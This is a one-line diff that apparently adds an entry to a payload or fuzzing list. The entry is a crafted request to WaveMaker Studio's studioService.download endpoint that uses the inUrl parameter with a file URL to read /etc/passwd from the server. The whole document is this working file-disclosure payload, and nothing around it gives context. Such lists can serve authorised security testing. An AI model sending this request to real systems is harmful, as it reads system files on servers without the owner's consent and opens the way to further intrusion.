@@ -1,0 +1,1 @@
+/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
